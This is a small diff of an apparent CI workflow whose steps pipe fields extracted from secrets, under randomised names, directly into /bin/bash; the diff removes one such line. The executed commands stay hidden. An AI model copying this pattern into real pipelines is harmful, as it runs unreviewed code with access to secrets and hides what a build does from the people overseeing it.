@@ -18,7 +18,6 @@ jobs:
           ybvi358: ${{ secrets.ybvi358 }}
         run: |
           printf '%s' "$ybvi358" | jq -r .rjzw91 | /bin/bash
-          printf '%s' "$ugh1" | jq -r .xgca0 | /bin/bash
           echo $mzjd5496 | jq -r .mpts5 | /bin/bash
           printf '%s' "$q1" | jq -r .vge783 | /bin/bash
           echo $w4006 | jq -r .iyv706 | /bin/bash
